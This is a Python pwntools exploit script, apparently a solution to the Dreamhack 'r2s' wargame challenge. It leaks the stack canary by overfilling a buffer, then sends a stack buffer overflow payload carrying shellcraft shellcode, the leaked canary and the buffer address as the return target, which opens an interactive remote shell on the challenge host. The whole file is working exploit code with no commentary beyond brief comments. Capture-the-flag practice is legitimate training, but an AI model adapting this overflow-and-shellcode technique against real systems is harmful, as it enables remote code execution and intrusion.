from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'
context.arch = "amd64"

p=remote('host3.dreamhack.games', 17401)
e = ELF("./r2s")

shellcode = asm(shellcraft.sh())

# get buf address
p.recvuntil("Address of the buf: ")
buf = int(p.recv(14), 16)

# canary leak
payload = b'A' * 0x59
p.sendafter("Input: ", payload)

p.recvuntil(payload)

canary = u64(b'\00' + p.recv(7))

slog("buf", buf)
slog("canary", canary)

#BOF
payload = shellcode
payload += b'A' * (88 - len(shellcode))
payload += p64(canary)
payload += b"A" * 8
payload += p64(buf)

p.sendlineafter("Input: ", payload)
p.interactive()
